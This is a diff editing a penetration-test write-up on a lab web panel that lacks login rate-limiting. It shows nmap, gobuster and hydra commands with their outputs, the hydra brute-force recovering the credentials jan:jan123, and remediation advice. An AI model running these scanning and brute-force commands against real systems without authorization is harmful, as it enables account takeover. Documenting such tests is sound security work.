@@ -30,23 +30,15 @@ This demonstrates that the panel does not limit or delay failed login attempts, 
 
 4. Proof of Concept (PoC)
 4.1. Port Scanning
-bash
-Copiar
-Editar
 nmap -sV -sC -oN jan_nmap.txt 192.168.1.130
 Open ports: 22/tcp (SSH), 8080/tcp (HTTP)
 
 4.2. Web Enumeration
-bash
-Copiar
-Editar
 gobuster dir -u http://192.168.1.130:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 45
 Discovered directory: /admin
 
 4.3. Credential Brute-Forcing
-bash
-Copiar
-Editar
+
 hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.1.130 http-post-form "/admin/index.php:username=^USER^&password=^PASS^:F=Invalid" -s 8080
 Discovered credentials: jan:jan123
 
@@ -72,10 +64,3 @@ Add delays (rate-limiting) between login attempts.
 Monitor and alert for brute-force patterns.
 
 (Optional) Implement multi-factor authentication (MFA) for administrative access.
-
-7. Attachments
-Output files from nmap, gobuster, and hydra.
-
-Terminal screenshots and web panel captures.
-
-Tool versions used during the test.
